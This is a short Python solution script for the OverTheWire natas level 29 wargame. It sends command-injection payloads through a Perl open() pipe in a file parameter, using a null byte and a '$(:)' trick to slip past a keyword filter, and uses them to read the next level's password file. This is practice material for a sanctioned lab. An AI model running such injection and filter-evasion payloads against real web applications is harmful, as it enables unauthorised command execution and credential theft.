"""
Help script to resolve natas challenge #29
"""
import requests
import json

level = 'natas29'
url = 'http://{}.natas.labs.overthewire.org'.format(level)

with open('natas.json') as j:
    credentials = json.load(j)
auth = (level, credentials[level])
del credentials

"""
In this level exploits the Perl's open() function.
"""
session = requests.Session()
# It is a perl file that seems to load other files. The usual way to do this is with open()
# If mode is set to "|-" the filename is read as a command from where the output will be piped to.
# We will have to "manually" terminate the string with a \0 though -> %00 in URL encoding :)
response = session.get(url + '/index.pl?file=|whoami%00', auth=auth)
# You should see a natas29 at the end of the page.
print(response.text)
# Trying to get something with the word natas returns the string "meeeeeep!"
# We will put something in between, that would translate to an empty string by the shell.
response = session.get(url + '/index.pl?file=|cat /etc/nat$(:)as_webpass/nat$(:)as30%00', auth=auth)
print(response.text)

